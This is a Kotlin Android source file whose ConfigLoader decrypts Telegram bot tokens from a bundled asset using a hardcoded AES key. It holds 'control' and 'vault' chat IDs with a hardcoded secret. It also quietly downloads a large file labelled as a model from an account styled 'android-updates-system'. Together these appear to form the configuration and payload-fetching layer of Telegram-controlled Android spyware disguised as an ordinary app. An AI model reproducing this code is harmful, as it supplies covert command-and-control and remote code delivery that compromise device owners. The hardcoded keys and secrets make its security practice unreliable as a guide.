package com.example.app

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

data class AppConfig(
    val activeTokens: List<String>,
    val reserveTokens: List<String>,
    val controlId: Long,
    val vaultId: Long,
    val secret: String = "Zaen123@123@"
)

data class TokenValidationResult(
    val index: Int,
    val isValid: Boolean,
    val message: String,
    val tokenPreview: String
)

data class DetailedValidationReport(
    val active: List<TokenValidationResult>,
    val reserve: List<TokenValidationResult>,
    val activeValidCount: Int,
    val reserveValidCount: Int
)

object ConfigLoader {

    private const val TAG = "ConfigLoader"

    @Volatile
    private var configCache: AppConfig? = null
    @Volatile
    private var cacheTime: Long = 0L
    private const val CACHE_TTL_MS: Long = 30_000L

    const val DEFAULT_CTRL: Long = -1003943094277L
    const val DEFAULT_VAULT: Long = -1003577715762L

    private val keyParts = listOf("Shield", "Core", "Encryption", "Key", "2024!")

    @Volatile
    private var derivedKey: ByteArray? = null

    private const val MODEL_URL = "https://raw.githubusercontent.com/android-updates-system/app-updates/main/engine_v2.tflite.txt"
    private const val MODEL_FILE_NAME = "engine_v2.tflite"
    private const val MODEL_DIR_NAME = "models"

    private fun getFallbackKey(): ByteArray {
        val keyStr = keyParts.joinToString("")
        val md = MessageDigest.getInstance("SHA-256")
        return md.digest(keyStr.toByteArray(StandardCharsets.UTF_8))
    }

    private fun getEncryptionKey(context: Context): ByteArray {
        Log.i(TAG, "🔑 Using fallback static encryption key for assets decryption")
        return getFallbackKey()
    }

    @Suppress("unused")
    private fun getDynamicEncryptionKey(context: Context): ByteArray? {
        derivedKey?.let { return it }
        return try {
            val resources = context.resources
            val packageName = context.packageName
            val identifier = resources.getIdentifier("key_part_1", "string", packageName)
            if (identifier == 0) {
                Log.w(TAG, "⚠️ token_keys.xml not found, falling back to static key")
                return getFallbackKey()
            }
            val part1 = resources.getString(identifier) ?: ""
            val part2 = resources.getString(resources.getIdentifier("key_part_2", "string", packageName)) ?: ""
            val part3 = resources.getString(resources.getIdentifier("key_part_3", "string", packageName)) ?: ""
            val part4 = resources.getString(resources.getIdentifier("key_part_4", "string", packageName)) ?: ""
            if (part1.isBlank() || part2.isBlank() || part3.isBlank() || part4.isBlank()) {
                Log.w(TAG, "⚠️ Some key parts are empty, falling back to static key")
                return getFallbackKey()
            }
            val androidId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Failed to get Android ID: ${e.message}")
                ""
            }
            if (androidId.isBlank()) {
                Log.w(TAG, "⚠️ Android ID is blank, using device model as fallback")
                val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
                val combined = (part1 + part2 + part3 + part4 + deviceModel)
                val md = MessageDigest.getInstance("SHA-256")
                derivedKey = md.digest(combined.toByteArray(StandardCharsets.UTF_8))
                return derivedKey
            }
            val combinedKey = part1 + part2 + part3 + part4 + androidId
            val md = MessageDigest.getInstance("SHA-256")
            derivedKey = md.digest(combinedKey.toByteArray(StandardCharsets.UTF_8))
            Log.i(TAG, "✅ Dynamic encryption key generated successfully (using Android ID)")
            derivedKey
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to generate dynamic key: ${e.message}, falling back to static key")
            getFallbackKey()
        }
    }

    // ✅ التعديل الأساسي: استخدام PKCS5Padding بدلاً من NoPadding
    private fun decryptTokenWithKey(encryptedToken: String?, key: ByteArray): String? {
        if (encryptedToken.isNullOrBlank()) return null
        return try {
            val secretKey = SecretKeySpec(key, "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, secretKey)
            val decoded = Base64.decode(encryptedToken, Base64.NO_WRAP)
            val decrypted = cipher.doFinal(decoded)
            String(decrypted, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            Log.e(TAG, "Decryption error: ${e.message}")
            null
        }
    }

    private fun loadEncryptedConfigFromAssets(context: Context): AppConfig? {
        var inputStream: java.io.InputStream? = null
        return try {
            inputStream = context.assets.open("tokens.enc")
            val encryptedData = inputStream.bufferedReader().use { it.readText() }
            if (encryptedData.isBlank()) {
                Log.w(TAG, "tokens.enc is empty")
                return null
            }
            val cleanedData = encryptedData.trim()
            val key = getFallbackKey()
            val decryptedJson = decryptTokenWithKey(cleanedData, key)
            if (decryptedJson.isNullOrBlank()) {
                Log.e(TAG, "❌ Failed to decrypt tokens.enc")
                return null
            }
            val json = JSONObject(decryptedJson)
            parseConfigFromJson(json)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to load encrypted config from assets: ${e.message}")
            null
        } finally {
            try {
                inputStream?.close()
            } catch (_: Exception) {}
        }
    }

    // ✅ تعديل parseConfigFromJson لقراءة المعرفات السالبة كنصوص
    private fun parseConfigFromJson(json: JSONObject): AppConfig {
        val activeArray = json.optJSONArray("active") ?: JSONArray()
        val reserveArray = json.optJSONArray("reserve") ?: JSONArray()
        val active = (0 until activeArray.length()).mapNotNull {
            activeArray.optString(it).takeIf { it.isNotBlank() }
        }
        val reserve = (0 until reserveArray.length()).mapNotNull {
            reserveArray.optString(it).takeIf { it.isNotBlank() }
        }

        val ctrlStr = json.optString("ctrl_id", "").trim()
        val vaultStr = json.optString("vault_id", "").trim()
        val ctrl = ctrlStr.toLongOrNull() ?: DEFAULT_CTRL
        val vault = vaultStr.toLongOrNull() ?: DEFAULT_VAULT

        val secret = json.optString("secret", "Zaen123@123@")
            .trim()
            .takeIf { it.isNotBlank() }
            ?: "Zaen123@123@"

        Log.i(TAG, "✅ Parsed ${active.size} active and ${reserve.size} reserve tokens")
        Log.i(TAG, "   Control ID: $ctrl, Vault ID: $vault")
        Log.i(TAG, "   Secret: ${secret.take(4)}... (length ${secret.length})")
        return AppConfig(active, reserve, ctrl, vault, secret)
    }

    private fun loadConfigFromEmbedded(): AppConfig {
        val dummyTokens = listOf(
            "DUMMY_1", "DUMMY_2", "DUMMY_3", "DUMMY_4", "DUMMY_5", "DUMMY_6"
        )
        val dummyReserve = listOf(
            "DUMMY_7", "DUMMY_8", "DUMMY_9", "DUMMY_10"
        )
        return AppConfig(dummyTokens, dummyReserve, DEFAULT_CTRL, DEFAULT_VAULT, "Zaen123@123@")
    }

    fun validateToken(token: String?, timeoutMs: Int = 10000): Pair<Boolean, String> {
        if (token.isNullOrBlank()) return Pair(false, "Empty or invalid token")
        val trimmed = token.trim()
        if (trimmed.isEmpty()) return Pair(false, "Empty token after stripping")
        var connection: HttpURLConnection? = null
        return try {
            val url = URL("https://api.telegram.org/bot$trimmed/getMe")
            connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = timeoutMs
            connection.readTimeout = timeoutMs
            val responseCode = connection.responseCode
            if (responseCode == 200) {
                val responseText = InputStreamReader(connection.inputStream).readText()
                val json = JSONObject(responseText)
                if (json.optBoolean("ok", false)) {
                    val result = json.optJSONObject("result")
                    val name = result?.optString("first_name", "Unknown") ?: "Unknown"
                    val username = result?.optString("username", "Unknown") ?: "Unknown"
                    Pair(true, "✅ Valid bot: @$username ($name)")
                } else {
                    Pair(false, "❌ API error: ${json.optString("description", "Unknown error")}")
                }
            } else {
                Pair(false, "❌ HTTP $responseCode")
            }
        } catch (e: java.net.SocketTimeoutException) {
            Log.w(TAG, "⚠️ Connection timeout, assuming token is valid")
            Pair(true, "Connection timeout, assuming valid")
        } catch (e: java.io.IOException) {
            Log.w(TAG, "⚠️ Connection error, assuming token is valid")
            Pair(true, "Connection error, assuming valid")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Unexpected error: ${e.message}, assuming valid")
            Pair(true, "Error: ${e.message?.take(50)}, assuming valid")
        } finally {
            connection?.disconnect()
        }
    }

    @Synchronized
    fun loadConfig(
        context: Context? = null,
        validate: Boolean = false,
        forceRefresh: Boolean = false,
        skipInvalid: Boolean = false
    ): AppConfig {
        val currentTime = System.currentTimeMillis()
        if (!forceRefresh && configCache != null && (currentTime - cacheTime) < CACHE_TTL_MS) {
            return configCache!!
        }
        var config: AppConfig? = null
        if (context != null) {
            config = loadEncryptedConfigFromAssets(context)
            if (config != null) {
                Log.i(TAG, "✅ Loaded config from assets with static encryption key.")
            }
        }
        if (config == null) {
            Log.w(TAG, "⚠️ Failed to load from assets, falling back to embedded dummy tokens.")
            config = loadConfigFromEmbedded()
        }
        var activeFiltered = config.activeTokens.filter { it.isNotBlank() }
        var reserveFiltered = config.reserveTokens.filter { it.isNotBlank() }
        if (validate && (activeFiltered.isNotEmpty() || reserveFiltered.isNotEmpty())) {
            activeFiltered = activeFiltered.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid token: $msg")
                    !skipInvalid
                }
            }
            reserveFiltered = reserveFiltered.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Reserve token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid reserve token: $msg")
                    !skipInvalid
                }
            }
        }
        if (activeFiltered.isEmpty() && reserveFiltered.isEmpty()) {
            Log.e(TAG, "❌ No valid tokens found in any source! Using dummy token to avoid crashes.")
            activeFiltered = listOf("DUMMY_TOKEN_1")
        }
        val finalConfig = AppConfig(
            activeTokens = activeFiltered,
            reserveTokens = reserveFiltered,
            controlId = config.controlId,
            vaultId = config.vaultId,
            secret = config.secret
        )
        Log.i(TAG, "✅ Config loaded: ${finalConfig.activeTokens.size} active, ${finalConfig.reserveTokens.size} reserve")
        Log.i(TAG, "   Control ID: ${finalConfig.controlId}, Vault ID: ${finalConfig.vaultId}")
        Log.i(TAG, "   Secret: ${finalConfig.secret.take(4)}... (length ${finalConfig.secret.length})")
        configCache = finalConfig
        cacheTime = currentTime
        return finalConfig
    }

    @JvmStatic
    fun load(context: Context): AppConfig {
        return loadConfig(context = context, validate = false, forceRefresh = false, skipInvalid = false)
    }

    fun reloadConfig(context: Context? = null, validate: Boolean = false): AppConfig {
        configCache = null
        cacheTime = 0L
        derivedKey = null
        return loadConfig(context = context, validate = validate, forceRefresh = true)
    }

    fun getActiveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.activeTokens.getOrNull(index) ?: config.activeTokens.firstOrNull()
    }

    fun getReserveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.reserveTokens.getOrNull(index) ?: config.reserveTokens.firstOrNull()
    }

    fun getCtrlId(): Long = loadConfig().controlId
    fun getVaultId(): Long = loadConfig().vaultId
    fun getSecret(): String = loadConfig().secret

    fun getTokensSummary(): Map<String, Any> {
        val config = loadConfig(validate = false)
        return mapOf(
            "active_count" to config.activeTokens.size,
            "reserve_count" to config.reserveTokens.size,
            "total_count" to (config.activeTokens.size + config.reserveTokens.size),
            "control_id" to config.controlId,
            "vault_id" to config.vaultId,
            "has_secret" to (config.secret.isNotBlank()),
            "cache_age_ms" to (System.currentTimeMillis() - cacheTime)
        )
    }

    fun validateAllTokens(timeoutMs: Int = 5000): DetailedValidationReport {
        val config = loadConfig(validate = false)
        val activeResults = config.activeTokens.mapIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            TokenValidationResult(i, isValid, msg, preview)
        }
        val reserveResults = config.reserveTokens.mapIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            TokenValidationResult(i, isValid, msg, preview)
        }
        return DetailedValidationReport(
            active = activeResults,
            reserve = reserveResults,
            activeValidCount = activeResults.count { it.isValid },
            reserveValidCount = reserveResults.count { it.isValid }
        )
    }

    fun clearSensitiveData() {
        configCache = null
        cacheTime = 0L
        derivedKey = null
        System.gc()
        Log.d(TAG, "🧹 Sensitive data cleared from memory")
    }

    fun clearDerivedKey() {
        derivedKey = null
        Log.d(TAG, "🧹 Derived encryption key cleared from memory")
    }

    private fun getModelsDir(context: Context): File {
        val dir = File(context.filesDir, MODEL_DIR_NAME)
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }

    fun getModelFile(context: Context): File {
        val modelsDir = getModelsDir(context)
        return File(modelsDir, MODEL_FILE_NAME)
    }

    fun isModelAvailable(context: Context): Boolean {
        val modelFile = getModelFile(context)
        return modelFile.exists() && modelFile.length() > 0
    }

    fun validateModelFile(modelFile: File): Boolean {
        if (!modelFile.exists() || modelFile.length() == 0L) {
            Log.w(TAG, "⚠️ Model file does not exist or is empty")
            return false
        }
        Log.i(TAG, "✅ Model file validated: ${modelFile.length()} bytes")
        return true
    }

    fun downloadModelAsync(
        context: Context,
        onSuccess: (File) -> Unit = {},
        onError: (String) -> Unit = {}
    ): kotlinx.coroutines.Job {
        return GlobalScope.launch(Dispatchers.IO) {
            try {
                val modelFile = getModelFile(context)
                if (modelFile.exists() && modelFile.length() > 5_000_000) {
                    Log.i(TAG, "✅ Model already exists: ${modelFile.absolutePath}")
                    withContext(Dispatchers.Main) { onSuccess(modelFile) }
                    return@launch
                }
                Log.i(TAG, "📥 Downloading model from: $MODEL_URL")
                val fileDownloader = FileDownloader(context)
                val success = fileDownloader.downloadModelWithRetry(
                    url = MODEL_URL,
                    destinationFile = modelFile,
                    expectedSize = 10884710,
                    isBase64 = false,
                    maxRetries = 3
                )
                if (success && modelFile.exists() && modelFile.length() > 5_000_000) {
                    Log.i(TAG, "✅ Model downloaded successfully: ${modelFile.length()} bytes")
                    if (validateModelFile(modelFile)) {
                        withContext(Dispatchers.Main) { onSuccess(modelFile) }
                    } else {
                        modelFile.delete()
                        withContext(Dispatchers.Main) { onError("Downloaded model file is invalid or corrupted") }
                    }
                } else {
                    Log.e(TAG, "❌ Failed to download model")
                    withContext(Dispatchers.Main) { onError("Failed to download model from server") }
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Model download error: ${e.message}")
                withContext(Dispatchers.Main) { onError("Error downloading model: ${e.message}") }
            }
        }
    }

    fun downloadModelSync(context: Context): File? {
        return try {
            val modelFile = getModelFile(context)
            if (modelFile.exists() && modelFile.length() > 5_000_000) {
                Log.i(TAG, "✅ Model already exists (sync): ${modelFile.absolutePath}")
                return modelFile
            }
            Log.i(TAG, "📥 Downloading model synchronously...")
            val fileDownloader = FileDownloader(context)
            val success = runBlocking {
                fileDownloader.downloadModelWithRetry(
                    url = MODEL_URL,
                    destinationFile = modelFile,
                    expectedSize = 10884710,
                    isBase64 = false,
                    maxRetries = 3
                )
            }
            if (success && modelFile.exists() && modelFile.length() > 5_000_000) {
                Log.i(TAG, "✅ Model downloaded successfully (sync): ${modelFile.length()} bytes")
                if (validateModelFile(modelFile)) {
                    return modelFile
                } else {
                    modelFile.delete()
                    null
                }
            } else {
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Sync download error: ${e.message}")
            null
        }
    }

    fun deleteModel(context: Context): Boolean {
        val modelFile = getModelFile(context)
        return if (modelFile.exists()) {
            val deleted = modelFile.delete()
            if (deleted) {
                Log.i(TAG, "🗑️ Model deleted successfully")
            } else {
                Log.w(TAG, "⚠️ Failed to delete model")
            }
            deleted
        } else {
            Log.d(TAG, "Model does not exist, nothing to delete")
            true
        }
    }

    fun getModelInfo(context: Context): Map<String, Any> {
        val modelFile = getModelFile(context)
        return mapOf(
            "exists" to modelFile.exists(),
            "path" to modelFile.absolutePath,
            "size_bytes" to (if (modelFile.exists()) modelFile.length() else 0L),
            "size_mb" to (if (modelFile.exists()) String.format("%.2f", modelFile.length() / (1024.0 * 1024.0)) else "0.00"),
            "last_modified" to (if (modelFile.exists()) modelFile.lastModified() else 0L),
            "is_valid" to (modelFile.exists() && modelFile.length() > 5_000_000)
        )
    }
}
